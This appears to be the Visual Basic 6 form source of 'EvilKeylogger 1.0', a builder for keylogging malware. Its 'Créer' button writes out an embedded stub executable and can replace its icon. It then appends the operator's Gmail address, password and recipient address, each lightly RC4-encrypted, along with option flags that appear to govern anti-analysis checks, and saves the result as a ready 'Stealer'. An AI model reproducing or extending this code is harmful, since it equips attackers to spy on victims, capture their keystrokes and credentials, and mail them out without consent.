VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{BD0C1912-66C3-49CC-8B12-7B347BF6C846}#13.0#0"; "Skin.ocx"
Begin VB.Form Form1 
   BackColor       =   &H80000007&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "EvilKeylogger 1.0"
   ClientHeight    =   3120
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   3930
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":0CCA
   ScaleHeight     =   3120
   ScaleWidth      =   3930
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame1 
      Caption         =   "FTP Settings"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000E&
      Height          =   3375
      Left            =   0
      TabIndex        =   0
      Top             =   -240
      Width           =   5055
      Begin VB.CommandButton Command2 
         Caption         =   "Options"
         Height          =   255
         Left            =   2040
         TabIndex        =   5
         Top             =   2880
         Width           =   1335
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Créer"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   480
         TabIndex        =   1
         Top             =   2880
         Width           =   1335
      End
      Begin VB.Frame Frame3 
         Height          =   615
         Left            =   240
         TabIndex        =   10
         Top             =   2640
         Width           =   3375
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   600
         TabIndex        =   4
         Text            =   "Email@gmail.com"
         Top             =   840
         Width           =   2655
      End
      Begin VB.TextBox Text2 
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   600
         PasswordChar    =   "*"
         TabIndex        =   3
         Text            =   "Password"
         Top             =   1440
         Width           =   2655
      End
      Begin VB.TextBox Text3 
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   600
         TabIndex        =   2
         Text            =   "Email@hotmail.fr"
         Top             =   2040
         Width           =   2655
      End
      Begin VB.Frame Frame2 
         Caption         =   "Mail Options"
         Height          =   2175
         Left            =   240
         TabIndex        =   6
         Top             =   360
         Width           =   3375
         Begin XtremeSkinFramework.SkinFramework SF 
            Left            =   2880
            Top             =   120
            _Version        =   851968
            _ExtentX        =   635
            _ExtentY        =   635
            _StockProps     =   0
         End
         Begin VB.Label Label3 
            Caption         =   "Mail:"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000007&
            Height          =   255
            Left            =   360
            TabIndex        =   9
            Top             =   1440
            Width           =   2415
         End
         Begin VB.Label Label2 
            Caption         =   "Password:"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000007&
            Height          =   255
            Left            =   360
            TabIndex        =   8
            Top             =   840
            Width           =   2415
         End
         Begin VB.Label Label1 
            Caption         =   "Gmail:"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000007&
            Height          =   255
            Left            =   360
            TabIndex        =   7
            Top             =   240
            Width           =   2415
         End
      End
      Begin MSComDlg.CommonDialog CD 
         Left            =   4320
         Top             =   2160
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Private Sub Command2_Click()
Form2.Show
End Sub

Sub Form_initialize()
Dim dllskin() As Byte
Dim Data() As Byte

dllskin = LoadResData(102, "CUSTOM")

Open Environ("TEMP") & "\Skin.DLL" For Binary As #1
Put #1, , dllskin
Close #1

SF.LoadSkin Environ("TEMP") & "\Skin.DLL", ""
SF.ApplyWindow Me.hwnd
    Me.Show
    DoEvents
        
End Sub



Private Sub Command1_Click()
Dim niller As String
Dim test() As Byte
Dim Errx As String

test = LoadResData(101, "CUSTOM")

Open Environ("TEMP") & "\fisier.exe" For Binary As #1
Put #1, , test
Close #1

If Form2.txtIcon.Text = "" Or Form2.txtIcon.Text = "Click me..." Then
Else
Dim ert As String
ReplaceIcons Form2.txtIcon.Text, Environ("TEMP") & "\fisier.exe", ert
End If

Open Environ("TEMP") & "\fisier.exe" For Binary As #1
niller = Space(LOF(1))
Get #1, , niller
Close #1

With CD
.DialogTitle = "Sauver Fichier"
.Filter = "Applications*.exe"
.ShowSave
End With


Open CD.FileName For Binary As #1
Put #1, , niller & "KYZERILOVEYOU" & RC4(Text1.Text, "lol") & "KYZERILOVEYOU" & RC4(Text2.Text, "lol") & "KYZERILOVEYOU" & RC4(Text3.Text, "lol") & "KYZERILOVEYOU" & Form2.Text1.Text & "KYZERILOVEYOU"
Put #1, , vbNullString & "KYZERYOUARETHEBEST" & Form2.anticheckn(0).Value & "KYZERYOUARETHEBEST" & Form2.anticheckn(1).Value & "KYZERYOUARETHEBEST" & Form2.anticheckn(2).Value & "KYZERYOUARETHEBEST" & Form2.anticheckn(3).Value & "KYZERYOUARETHEBEST" & Form2.anticheckn(4).Value & "KYZERYOUARETHEBEST" & Form2.anticheckn(5).Value & "KYZERYOUARETHEBEST" & Form2.anticheckn(6).Value & "KYZERYOUARETHEBEST" & Form2.anticheckn(7).Value & "KYZERYOUARETHEBEST" & Form2.anticheckn(8).Value & "KYZERYOUARETHEBEST"
Put #1, , vbNullString & "KYZERKISSME" & Form2.Check1.Value & "KYZERKISSME" & Form2.Check2.Value & "KYZERKISSME" & Form2.Check3.Value & "KYZERKISSME"
Close #1

MsgBox "Stealer Créer!", vbInformation, Me.Caption



End Sub

Private Sub Form_Unload(Cancel As Integer)
Unload Form1
Unload Form2
End Sub

Private Sub Frame1_DragDrop(Source As Control, X As Single, Y As Single)

End Sub

Private Sub Text1_click()
Text1.Text = ""
End Sub

Private Sub Text2_Click()
Text2.Text = ""
End Sub

Private Sub Text3_Click()
Text3.Text = ""
End Sub
